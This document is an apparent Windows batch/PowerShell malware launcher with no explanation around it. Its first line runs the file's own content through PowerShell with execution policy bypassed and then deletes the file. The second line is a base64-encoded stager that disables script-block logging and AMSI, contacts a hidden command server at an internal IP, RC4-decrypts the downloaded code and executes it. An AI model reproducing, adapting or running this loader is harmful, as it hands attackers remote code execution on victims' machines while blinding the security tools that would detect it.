# 2>NUL & @CLS & PUSHD "%~dp0" & "%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -nol -nop -ep bypass "[IO.File]::ReadAllText('%~f0')|iex" & DEL "%~f0" & POPD /B
powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAHIAUwBpAG8ATgBUAGEAYgBMAEUALgBQAFMAVgBlAHIAcwBpAG8ATgAuAE0AYQBKAE8AUgAgAC0AZwBFACAAMwApAHsAJABiAGYAMwAxAD0AWwBSAGUARgBdAC4AQQBzAHMARQBNAEIAbAB5AC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcAZQB0AEYASQBlAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAGIAZgAzADEAKQB7ACQAMAAxADkAZgA9ACQAYgBmADMAMQAuAEcARQBUAFYAQQBsAHUARQAoACQATgB1AEwAbAApADsASQBmACgAJAAwADEAOQBGAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMAAxADkAZgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAwADEAOQBGAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMAbwBMAEwARQBDAFQASQBvAG4AcwAuAEcAZQBOAGUAUgBpAEMALgBEAEkAQwB0AGkATwBuAEEAUgBZAFsAcwB0AFIASQBuAEcALABTAFkAUwB0AGUATQAuAE8AYgBKAEUAYwBUAF0AXQA6ADoAbgBFAFcAKAApADsAJABWAGEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAEEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADAAMQA5AGYAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBhAGwAfQBFAEwAcwBFAHsAWwBTAGMAcgBJAHAAdABCAEwAbwBjAGsAXQAuACIARwBlAFQARgBJAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAYQBMAHUARQAoACQATgBVAGwAbAAsACgATgBFAHcALQBPAEIASgBFAGMAdAAgAEMAbwBMAGwARQBjAHQAaQBvAG4AcwAuAEcAZQBOAGUAUgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwB0AHIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUAZgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBFAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAdABGAGkARQBsAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgB1AEwAbAAsACQAdABSAHUAZQApADsAfQA7AFsAUwB5AFMAVABlAE0ALgBOAGUAVAAuAFMARQByAHYAaQBDAEUAUABvAEkATgB0AE0AYQBuAGEARwBFAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBPAG4AdABpAG4AVQBlAD0AMAA7ACQAMQAxADMAZQA9AE4AZQBXAC0ATwBiAGoAZQBjAHQAIABTAFkAUwBUAGUATQAuAE4AZQB0AC4AVwBlAEIAQwBMAEkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBvAGQASQBOAGcAXQA6ADoAVQBOAGkAYwBvAEQAZQAuAEcAZQB0AFMAVABSAGkATgBHACgAWwBDAE8AbgB2AEUAUgB0AF0AOgA6AEYAUgBPAE0AQgBBAHMARQA2ADQAUwBUAFIAaQBuAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHcAQQBDADQAQQBNAGcAQQB1AEEARABFAEEATgBRAEEANgBBAEQAZwBBAE0AQQBBADQAQQBEAEEAQQAnACkAKQApADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAMQAxADMAZQAuAEgARQBhAGQARQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADEAMQAzAGUALgBQAFIATwB4AFkAPQBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBXAGUAYgBSAGUAUQB1AEUAcwBUAF0AOgA6AEQAZQBmAGEAVQBMAFQAVwBFAGIAUABSAE8AeAB5ADsAJAAxADEAMwBlAC4AUABSAG8AWAB5AC4AQwBSAGUAZABlAG4AdABJAEEATABTACAAPQAgAFsAUwBZAHMAdABFAE0ALgBOAEUAVAAuAEMAcgBlAEQAZQBOAHQAaQBBAGwAQwBBAGMASABFAF0AOgA6AEQAZQBGAEEAdQBMAHQATgBlAHQAVwBPAFIASwBDAFIAZQBEAEUATgB0AEkAYQBMAFMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAMQAxADMAZQAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAVABlAE0ALgBUAGUAeAB0AC4ARQBuAEMAbwBkAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAWQB0AEUAcwAoACcAUQB8AGYAYwA4AFkAVQBGAHgAWAAsAEMANwB6AE8ASQBUAHkANQBFAEEAdgAwAGUAZwB+ADsAbgByAHEAQgB9ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAMQAxADMARQAuAEgARQBhAEQARQBSAFMALgBBAEQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAUQBRAGQAVABUAE0AYwBzAEMAbgBRAEwAPQBBAG4AVQBGAFkASQBhAFgAegBxADcANQBaAEQASQA5AC8AMABmAEoAawBZAFQAMgBLAGMAUQA9ACIAKQA7ACQARABhAFQAYQA9ACQAMQAxADMARQAuAEQAbwBXAG4ATABPAGEAZABEAEEAdABBACgAJABzAEUAcgArACQAdAApADsAJABpAFYAPQAkAGQAYQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAEQAQQB0AEEAWwA0AC4ALgAkAGQAQQB0AGEALgBMAGUATgBHAHQASABdADsALQBqAE8ASQBuAFsAQwBoAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
